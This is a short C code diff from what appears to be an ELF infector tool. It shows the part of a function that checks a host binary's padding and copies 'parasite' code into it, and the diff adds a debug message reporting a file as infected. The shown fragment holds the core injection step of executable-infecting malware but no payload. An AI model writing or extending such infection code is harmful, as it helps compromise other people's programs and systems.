@@ -106,7 +106,7 @@ void ElfParser(char *filepath)
 	Elf64_Off padding_size = GetPaddingSize(host_mapping);
 	if (padding_size < parasite_size)
 	{
-		fprintf(stderr, RED"[+]"RESET" Host "YELLOW"%s"RESET" cannot accomodate parasite, parasite is angry "GREEN"x_x \n"RESET, filepath); 
+		fprintf(stderr, RED"[+]"RESET" Host "YELLOW"%s"RESET" cannot accomodate parasite, parasite is angry "RED"x_x \n"RESET, filepath); 
 		return;
 	}
 	
@@ -140,6 +140,11 @@ void ElfParser(char *filepath)
 	// Inject parasite in Host
 	memcpy( (host_mapping + parasite_offset), parasite_code, parasite_size);
 	//DumpMemory(host_mapping + parasite_offset, parasite_size);
+
+
+	// DEBUG
+	fprintf(stdout, BLUE"[+]"RED"Infected x_x"RESET"  :  "GREEN"%s\n"RESET, filepath);
+
 
 
 	// Unmaping host
